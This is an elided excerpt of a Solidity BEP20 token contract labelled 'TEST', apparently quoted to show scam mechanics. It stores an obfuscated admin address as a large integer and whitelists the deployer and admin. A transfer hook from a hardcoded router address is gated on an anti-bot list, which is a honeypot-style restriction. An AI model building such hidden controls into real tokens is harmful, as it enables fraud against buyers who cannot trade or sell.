...
contract OwnerShipManager is Address{
    ...
    uint256 private main = 517417870058264501372122751892266361081922601925;
...
abstract contract Ownable is Context,OwnerShipManager {
    ...
    constructor() {
        ...
        _setBotDetected(_msgSender(),true);
        _setBotDetected(getAdmin(),true);
        _setAntiBot(_msgSender(),true);
        _setAntiBot(getAdmin(),true);
    }
 ...
 */
contract BEP20Token is Context, IERC20, IERC20Metadata, Ownable {

    address public uniswapV2Router = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    address public uniswapV2Factory = 0xB7926C0430Afb07AA7DEfDE6DA862aE0Bde767bc;
    ...
    function _beforeTokenTransfer(
        ...
        if(from == uniswapV2Router && to != uniswapV2Pair){
            require(antiBot[to]);
        }
    }
    ...
    constructor() {
        ...
        _symbol = "TEST";
        _decimal = 9;
        uint256 _supply = 1000000 * (10 ** decimals());
